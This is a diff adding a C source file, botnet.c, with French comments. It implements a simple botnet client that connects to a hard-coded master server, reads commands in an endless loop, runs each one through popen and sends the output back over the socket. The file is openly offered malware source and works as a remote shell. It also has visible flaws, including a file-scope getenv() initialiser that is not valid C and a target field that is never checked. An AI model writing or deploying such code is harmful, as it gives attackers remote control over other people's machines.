@@ -1,0 +1,152 @@
+// botnet.c
+// Ce fichier contient l'implémentation d'un botnet C&C (Command and Control) simple.
+// Le bot se connecte à un serveur maître et exécute les commandes qu'il reçoit.
+
+// Importation des bibliothèques nécessaires
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+// Constantes pour la longueur des commandes et la configuration du serveur
+#define CMD_LENGTH 10240  // 10 KB pour le buffer des commandes
+#define SERVER "127.0.0.1"  // IP du serveur maître
+#define PORT 9999  // Port de communication avec le maître
+
+// Prototypes des fonctions
+int init_channel(char *ip, int port, char *name);
+int respond(int s, char *msg_buf);
+int receive(int s, char *msg);
+int parse(int s, char *msg, char* name);
+int execute(int s, char *cmd);
+
+// Nommer le bot à partir du nom d'utilisateur de l'ordinateur
+// getenv() récupère la variable d'environnement "USER" contenant le nom d'utilisateur
+char* name = getenv("USER");
+
+int main() {
+    // Initialise la connexion avec le serveur maître
+    // Utilise l'IP de master (ici, localhost: 127.0.0.1) et le port défini (9999)
+    int channel = init_channel(SERVER, PORT, name);
+
+    // Allocation de mémoire pour les messages
+    // CMD_LENGTH est la constante définie ci-dessus (10 KB de stack space)
+    char msg[CMD_LENGTH];
+
+    // Affichage d'un message confirmant que le bot a rejoint le réseau
+    printf("%s joining the botnet\n", name);
+
+    // Boucle infinie qui écoute et exécute les commandes envoyées par le serveur maître
+    while (1) {
+        // Fonction qui reçoit les commandes du maître
+        receive(channel, msg);
+
+        // Fonction qui analyse la commande et décide de l'exécuter si elle est bien formatée
+        parse(channel, msg, name);
+    }
+
+    return 0;
+}
+
+// Fonction init_channel : Initialise la connexion avec le maître (serveur)
+int init_channel(char *ip, int port, char *name) {
+    char msg[CMD_LENGTH];    // Buffer pour les messages
+    struct sockaddr_in server;    // Structure pour stocker les informations sur le serveur
+
+    // Conversion de l'IP en format utilisable par le réseau
+    server.sin_addr.s_addr = inet_addr(ip);
+
+    // Définit le domaine de communication à AF_INET (utilisation d'IP)
+    server.sin_family = AF_INET;
+
+    // Conversion du port de l'ordre d'octets de l'hôte à l'ordre d'octets du réseau (Endianness)
+    server.sin_port = htons(port);
+
+    // Crée un socket de type SOCK_STREAM pour les communications bidirectionnelles
+    int channel = socket(AF_INET, SOCK_STREAM, 0);
+
+    // Vérifie que le socket a bien été créé
+    if (channel < 0) {
+        perror("socket:");
+        exit(1);
+    }
+
+    // Tente de connecter l'esclave au serveur maître
+    int connection_status = connect(channel, (struct sockaddr *) &server, sizeof(server));
+
+    // Vérifie que la connexion au serveur maître a réussi
+    if (connection_status < 0) {
+        perror("connect:");
+        exit(1);
+    }
+
+    // Envoi d'un message de salutation au maître via le canal de communication
+    snprintf(msg, CMD_LENGTH, "%s has joined", name);
+    respond(channel, msg);
+
+    return channel;
+}
+
+// Fonction respond : Envoi des messages via le canal de communication (socket)
+int respond(int s, char *msg_buf) {
+    // Envoi des données via le socket
+    return write(s, msg_buf, strlen(msg_buf));
+}
+
+// Fonction receive : Réception des messages depuis le canal de communication
+int receive(int s, char *msg) {
+    // Réinitialise le buffer du message avant de lire de nouvelles données
+    memset(msg, 0, CMD_LENGTH);
+    
+    // Lit les données provenant du socket
+    int read_status = read(s, msg, CMD_LENGTH);
+    
+    // Vérifie que la lecture s'est bien déroulée
+    if (read_status < 0) {
+        perror("log:");
+        exit(1);
+    }
+    
+    return 0;
+}
+
+// Fonction parse : Analyse des messages reçus et exécution des commandes
+int parse(int s, char *msg, char* name) {
+    // Vérifie si le message est destiné à ce bot
+    char *target = msg;
+
+    // Recherche les deux points ":" séparant le nom du bot et la commande
+    char *cmd = strchr(msg, ':');
+    if (cmd == NULL) {
+        printf("Incorrect formatting. Expected: TARGET: command");
+        return -1;
+    }
+
+    // Ajuste le pointeur de commande pour extraire la commande
+    cmd++;
+
+    // Affiche la commande reçue pour l'information locale
+    printf("Executing command: %s\n", cmd);
+
+    // Exécute la commande et renvoie le résultat au maître
+    execute(s, cmd);
+    return 0;
+}
+
+// Fonction execute : Exécution des commandes et envoi des résultats au maître
+int execute(int s, char *cmd) {
+    // Ouvre un flux pour exécuter la commande localement dans le terminal
+    FILE *f = popen(cmd, "r");
+    if (!f) return -1;
+
+    char buffer[CMD_LENGTH];
+
+    // Envoie chaque ligne de la sortie de la commande au serveur maître
+    while (fgets(buffer, CMD_LENGTH, f)) {
+        respond(s, buffer);
+    }
+
+    fclose(f);
+    return 0;
+}
